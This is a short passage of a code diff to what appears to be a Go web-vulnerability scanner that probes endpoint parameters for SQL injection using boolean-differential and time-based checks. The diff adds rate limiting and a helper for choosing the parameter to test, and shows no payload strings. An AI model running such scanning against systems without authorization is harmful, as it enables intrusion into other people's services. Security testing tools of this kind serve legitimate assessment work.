+	if rl != nil { rl.Wait() }
 	baseline := fetchWithPayload(client, cfg, ep, param, "1")
 
 	for _, p := range payloads {
+		if rl != nil { rl.Wait() }
 		body := fetchWithPayload(client, cfg, ep, param, p.payload)
 		if body == "" {
 			continue
@@ -1104,6 +1222,18 @@ func pickParam(ep EntryPoint) string {
 		return k
 	}
 	return "id"
+}
+
+// pickParamFromHeuristic selects the parameter that Phase 1 actually tested.
+func pickParamFromHeuristic(hr HeuristicResult, ep EntryPoint) string {
+	// If heuristic tested a specific param, use it.
+	if hr.TestPayload != "" && hr.TestPayload != "boolean-differential" && hr.TestPayload != "time-based" {
+		// The probe tested params in order; use pickLikelyInjectableParam which was used in Phase 1.
+		if len(ep.Params) > 0 {
+			return pickLikelyInjectableParam(ep.Params)
+		}
+	}
+	return pickParam(ep)
 }
 
 // buildURL creates the full URL with the given param set to the payload value.
